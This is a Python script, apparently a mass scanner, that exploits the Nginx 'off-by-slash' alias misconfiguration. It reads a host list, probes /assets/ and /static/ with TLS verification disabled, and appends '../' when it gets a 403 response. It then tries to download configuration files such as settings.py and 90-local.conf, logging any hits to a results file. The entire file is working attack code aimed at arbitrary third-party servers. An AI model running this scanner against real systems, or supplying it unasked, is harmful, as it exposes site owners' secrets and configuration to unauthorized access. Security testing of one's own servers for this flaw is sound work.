import sys
import requests
# Disable InsecureRequestWarnings
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) == 2:
    try:
        HOST_LIST = [line.strip () for line in open (sys.argv[1])]
    except FileNotFoundError:
        exit("Giving input [{}] seems not to be file. Please, give it a list.\nExample: ./nginx-off-slash.py hosts.txt"
             .format(sys.argv[1]))

elif len(sys.argv) == 1 or len(sys.argv) >= 3:
        exit ("Please, give me a list of hosts. \nExample: ./nginx-off-slash.py hosts.txt")


def nginx_off_slash():
    print()
    print('------------------------------------------------------------')
    print("                 Nginx-OFF-Slash has started!")
    print('------------------------------------------------------------')
    print()

    scheme_protocols = ['http://', 'https://']
    off_slash_dirs = ['/assets/', '/static/']
    config_files = ['settings.py', 'app.js', '90-local.conf', 'assets/app.js', 'settings/90-local.conf']

    counter = 0
    for host in HOST_LIST:
        counter = counter + 1
        print ("[{}] Trying {}".format (counter, host))

        # Ensure giving host is clean by striping out the end trail slash.
        host = host.strip(' /')
        for protocol in scheme_protocols:
            try:
                for endpoint in off_slash_dirs:
                    url = protocol + host + endpoint
                    r = requests.get(url, timeout=4.0, verify=False)
                    # Check for 403 Forbidden return
                    if r.status_code == 403:
                        """print('[+] {} Could be vulnerable! We had a 403 return! Checking for false positive. . . '
                              .format(url))"""

                        # Perform more checks! Strip slash trail from endpoint and add exploit.
                        url = protocol + host + '/' + endpoint.strip('/') + '../'
                        r = requests.get(url, timeout=4.0, verify=False)

                        if r.status_code == 403:
                            """print('[+] {} It seems vulnerable !!!! Trying to get config files . . .'
                                  .format(url))"""

                            for file in config_files:
                                try:
                                    url = protocol + host + '/' + endpoint.strip ('/') + '../' + file
                                    r = requests.get (url, timeout=4.0, verify=False)
                                    if r.status_code == 200:
                                        print('[+] VULNERABLE ENDPOINT FOUND! \n '
                                              '{}'.format(url))

                                        with open('./nginx_off_slash_results.txt', 'a+') as results:
                                            results.write(url + '\n')

                                except Exception:
                                    continue


                    # If first request returns anything else rather than 403, go to the next in loop.
                    else:
                        continue

            # Handle errors for all kind and flavors !
            except requests.exceptions.HTTPError as err:
                # Ignore anything with 404 and 502 and loop to the next
                if r.status_code == 404 or r.status_code == 502:
                    continue

            except requests.exceptions.ConnectionError:
                continue
                # print('\t {}: Max retries exceeded.'.format(protocol))

            except requests.exceptions.Timeout:
                continue
            # print('\t {} Timeout'.format(protocol))
            # Maybe set up for a retry, or continue in a retry loop

            except requests.exceptions.TooManyRedirects:
                continue
                # print('\t {} Too Many Redirects'.format(protocol))
                # Tell the user their URL was bad and try a different one
            except requests.exceptions.RequestException as e:
                # catastrophic error. bail.
                continue


if __name__ == '__main__':
    try:
        nginx_off_slash()

    except KeyboardInterrupt:
        print('Okay, Exiting...')
        sys.exit(0)

